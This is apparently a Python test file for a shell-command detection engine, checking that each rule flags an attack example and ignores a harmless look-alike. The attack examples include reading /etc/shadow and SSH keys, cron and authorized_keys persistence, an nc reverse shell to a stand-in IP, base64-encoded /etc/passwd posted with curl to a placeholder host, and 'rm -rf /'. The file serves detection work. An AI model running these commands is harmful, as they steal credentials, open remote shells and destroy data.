import sys
from pathlib import Path
sys.path.insert(0,str(Path(__file__).resolve().parents[1]))
from czt.brain.rules import evaluate
from czt.brain.tokenizer import TOKEN_VOCABULARY, tokenize

RULE_CASES={
    "read_shadow":("cat /etc/shadow","cat /etc/hostname"),
    "ssh_material":("cat ~/.ssh/id_rsa","ls ~/.ssh"),
    "sudo_enumeration":("sudo -l","sudo systemctl status nginx"),
    "account_admin":("usermod -aG sudo alice","usermod -aG users alice"),
    "persistence_cron":("crontab -e","crontab -l"),
    "persistence_keys":("echo key >> ~/.ssh/authorized_keys","cat ~/.ssh/known_hosts"),
    "history_clear":("history -c","history"),
    "remote_fetch":("curl https://example.invalid/a","curl --version"),
    "reverse_shell":("nc -e /bin/sh 203.0.113.9 4444","nc -z 127.0.0.1 22"),
    "encoded_network":("base64 /etc/passwd | curl -X POST https://example.invalid","base64 /etc/passwd"),
    "root_recursive_delete":("rm -rf /","rm -rf ./build"),
    "shadow_copy":("wipefs /dev/sda","df -h"),
}

def names(command): return {hit["name"] for hit in evaluate(command)}

def test_every_named_rule_has_attack_and_harmless_lookalike():
    for rule,(attack,benign) in RULE_CASES.items():
        assert rule in names(attack), f"{rule} failed to detect its attack example"
        assert rule not in names(benign), f"{rule} matched its harmless look-alike"

def test_tokenizer_uses_fixed_bounded_vocabulary_and_other_fallback():
    assert 50 <= len(TOKEN_VOCABULARY)-1 <= 100
    assert tokenize("novel-command --odd-arg") ["token"]=="OTHER"
    assert tokenize("cat /etc/shadow")["token"] in TOKEN_VOCABULARY
